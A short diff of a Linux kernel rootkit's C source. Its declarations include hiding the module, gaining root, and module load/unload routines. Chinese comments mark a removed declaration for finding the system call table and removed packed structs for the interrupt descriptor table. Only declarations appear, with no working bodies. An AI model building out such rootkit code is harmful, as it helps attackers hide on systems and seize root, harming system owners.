@@ -36,25 +36,6 @@ static void __init hide_myself(void);
 // 提升权限
 void get_root(void);
 
-// 寻找系统调用表地址
-static void disp_sys_call_table(void);
-
-// 中断描述符表寄存器结构
-struct
-{
-    unsigned short limit;
-    unsigned int base;
-} __attribute__((packed)) idtr;
-
-// 中断描述符表结构
-struct
-{
-    unsigned short off1;
-    unsigned short sel;
-    unsigned char none, flags;
-    unsigned short off2;
-} __attribute__((packed)) idt;
-
 // 模块加载、卸载函数声明
 static int __init rootkit_init(void);
 static void __exit rootkit_exit(void);
